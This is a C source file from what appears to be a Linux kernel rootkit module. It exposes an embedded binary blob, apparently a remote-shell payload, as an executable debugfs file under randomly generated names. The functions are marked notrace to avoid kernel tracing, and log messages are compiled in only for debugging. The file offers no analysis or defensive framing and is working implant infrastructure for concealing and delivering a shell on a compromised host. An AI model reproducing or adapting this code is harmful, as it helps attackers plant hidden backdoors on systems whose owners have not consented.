#include <linux/module.h>
#include <linux/debugfs.h>
#include <linux/random.h>
#include <linux/seq_file.h>

#include "config.h"
#include "debugfs.h"
#include "htm.h"

#define HTM_SIZE_RSH ((size_t)(_rsh_end - _rsh_start))

extern unsigned char _rsh_start[];
extern unsigned char _rsh_end[];

static char _dir_name[HTM_MAX_FILENAME];
static char _rsh_name[HTM_MAX_FILENAME];

static struct dentry *_dir = NULL;
static struct dentry *_file = NULL;

static notrace int _show(struct seq_file *m, void *v)
{
	seq_write(m, _rsh_start, (_rsh_end - _rsh_start));
	return 0;
}

static notrace int _open(struct inode *inode, struct file *file)
{
	return single_open(file, _show, inode->i_private);
}

static const struct file_operations _fops = {
	.owner   = THIS_MODULE,
	.open    = _open,
	.read    = seq_read,
	.llseek  = seq_lseek,
	.release = single_release,
};

notrace int htm_debugfs_rsh_create(void)
{
	if (_dir && _file) {
		#ifdef HTM_DEBUG
		htm_pr_warn("debugfs file is already exposed");
		#endif

		return -EINVAL;
	}
	else
	if (_dir) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs directory already exists");
		#endif

		return -EINVAL;
	}
	else
	if (_file) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs file already exists");
		#endif

		return -EINVAL;
	}

	scnprintf(
		_dir_name, sizeof(_dir_name),
		"%016llx" HTM_FS_STRING, get_random_u64()
	);

	scnprintf(
		_rsh_name, sizeof(_rsh_name),
		"%016llx" HTM_FS_STRING, get_random_u64()
	);

	if (! (_dir = debugfs_create_dir(_dir_name, NULL))) {
		#ifdef HTM_DEBUG
		htm_pr_err("failed to initialize debugfs directory for module");
		#endif

		return -ENOMEM;
	}

	#ifdef HTM_DEBUG
	htm_pr_notice("debugfs directory created: %s", _dir_name);
	#endif

	if (! (_file = debugfs_create_file(_rsh_name, 0500, _dir, NULL, &_fops))) {
		#ifdef HTM_DEBUG
		htm_pr_err(
			"failed to create debugfs file: %s - removing directory: %s",
			_rsh_name, _dir_name
		);
		#endif

		debugfs_remove(_dir);

		memset(_dir_name, 0x00, sizeof(_dir_name));
		memset(_rsh_name, 0x00, sizeof(_rsh_name));

		return -ENOMEM;
	}

	#ifdef HTM_DEBUG
	htm_pr_notice("debugfs file created: %s", _rsh_name);
	#endif

	return 0;
}

notrace int htm_debugfs_rsh_remove(void)
{
	if (! _file && ! _dir) {
		#ifdef HTM_DEBUG
		htm_pr_warn("debugfs file is not exposed");
		#endif

		return -EINVAL;
	}
	else
	if (! _file) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs file does not exist");
		#endif

		return -EINVAL;
	}
	else
	if (! _dir) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs directory does not exist");
		#endif

		return -EINVAL;
	}

	debugfs_remove_recursive(_dir);

	#ifdef HTM_DEBUG
	htm_pr_notice("debugfs directory removed: %s", _dir_name);
	#endif

	_file = NULL;
	memset(_rsh_name, 0x00, sizeof(_rsh_name));

	_dir = NULL;
	memset(_dir_name, 0x00, sizeof(_dir_name));

	return 0;
}

notrace char *htm_debugfs_dir_name(void)
{
	return _dir_name;
}

notrace char *htm_debugfs_rsh_name(void)
{
	return _rsh_name;
}
